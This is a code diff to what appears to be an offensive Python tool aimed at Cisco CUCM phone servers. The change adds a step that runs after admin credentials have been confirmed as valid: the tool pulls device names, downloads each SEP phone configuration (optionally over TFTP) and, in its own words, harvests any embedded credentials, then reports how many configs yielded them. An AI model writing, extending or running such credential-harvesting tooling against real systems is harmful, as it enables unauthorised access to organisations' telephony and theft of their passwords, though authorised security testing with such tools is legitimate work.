@@ -1806,7 +1806,8 @@ def _verify_worker(work_queue, results, port, db_file, timeout=10, _login_fn=Non
                 results.setdefault('valid_logins', {}).setdefault(cucm_host, (username, password))
 
 
-def run_verify(hosts, pairs, port, threads, db_file, dump_devices=True, _dump_fn=None):
+def run_verify(hosts, pairs, port, threads, db_file, dump_devices=True,
+               use_tftp=True, _dump_fn=None, _download_fn=None):
     """
     Top-level orchestrator for --verify.
 
@@ -1871,9 +1872,18 @@ def run_verify(hosts, pairs, port, threads, db_file, dump_devices=True, _dump_fn
     if dump_devices and valid_logins:
         if _dump_fn is None:
             _dump_fn = dump_admin_devices
+        if _download_fn is None:
+            _download_fn = download_uds_discovered_configs
         print(f'[+] Dumping SEP device lists from {len(valid_logins)} host(s) with valid admin access...')
         for host, (username, password) in valid_logins.items():
-            _dump_fn(host, port, username, password, db_file)
+            device_names = _dump_fn(host, port, username, password, db_file)
+            # Exact device names from the admin side -> fetch each SEP config
+            # directly (no MAC brute force) and harvest any embedded credentials.
+            if device_names:
+                print(f'[+] {host}: downloading {len(device_names)} device config(s)...')
+                hits = _download_fn(host, device_names, db_file, use_tftp=use_tftp)
+                print(f'[+] {host}: config download complete, '
+                      f'{hits}/{len(device_names)} config(s) yielded credentials')
 
     return results
 
@@ -3318,6 +3328,7 @@ def main():
             threads=args.verify_threads,
             db_file=db_file,
             dump_devices=not args.no_device_dump,
+            use_tftp=use_tftp,
         )
         quit(0)
 
